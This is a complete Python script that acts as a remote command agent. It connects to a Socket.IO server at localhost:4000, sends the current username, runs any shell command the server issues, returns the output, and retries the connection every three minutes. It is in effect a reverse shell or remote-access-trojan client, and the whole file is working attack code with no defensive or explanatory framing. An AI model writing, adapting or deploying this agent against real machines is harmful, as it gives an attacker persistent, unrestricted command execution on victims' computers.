import subprocess
import socketio
import requests
import time

sio = socketio.Client()
url = 'http://localhost:4000/'

mycwd = subprocess.run('cd', shell=True, capture_output=True, text=True).stdout.strip()

def execute(cmd, cwd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd=cwd)

whoami = execute('whoami', mycwd).stdout.strip()

@sio.on('connect')
def on_connect():
    sio.emit('intro', whoami)

@sio.on('cmd')
def command(cmd):
    global mycwd
    if cmd.startswith('cd '):
        cmd = cmd+' && cd'
        result = execute(cmd, mycwd)
        if result.returncode == 0:
            mycwd = result.stdout.strip()
            sio.emit('command', {'user': whoami, 'cmd': mycwd})
        else:
            sio.emit('command', {'user': whoami, 'cmd': result.stderr.strip()})
        return

    result = execute(cmd, mycwd)
    if result.returncode != 0:
        sio.emit('command', {'user': whoami, 'cmd': result.stderr.strip()})
    else:
        sio.emit('command', {'user': whoami, 'cmd': result.stdout.strip()})


def connect_to_server():
    while True:
        try:
            sio.connect(url)
            break
        except socketio.exceptions.ConnectionError as e:
            print(f"Connection failed: {e}. Retrying in 3 minutes...")
            time.sleep(180)

connect_to_server()
sio.wait()
